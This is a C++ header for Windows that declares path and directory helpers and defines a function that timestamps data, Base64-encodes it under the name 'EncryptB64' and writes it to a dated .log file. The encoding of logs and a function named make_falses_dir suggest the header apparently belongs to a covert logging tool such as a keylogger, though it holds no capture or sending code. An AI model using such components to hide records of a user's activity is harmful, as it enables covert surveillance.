#ifndef __IO__H
#define __IO__H

#include <string>
#include <cstdlib> // for the get-environment function
#include <sstream>
#include <windows.h>
#include "Base64.hpp"
#include "Helper.hpp"

namespace IO{
    std::string get_path(const bool append_separator = false);
    bool make_one_dir(std::string path);
    bool make_dir(std::string path);
    void make_falses_dir(void);
    template<typename T>
    inline std::string write_log(const T &t){
        std::string path = get_path(true);
        Helper::DateTime dt;
        std::string file_name = dt.GetDateTimeString("_") + ".log";
        //we can't use ':' in Windows' file names, so we use '_' as separator
        try{
            std::ofstream file(path + file_name);
            if(!file) return ""; // if file cannot be opened or used, then return an empty string
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t << std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file) return "";
            file.close();
            return file_name;
        }catch(...){
            return "";
        }
    }
}

#endif
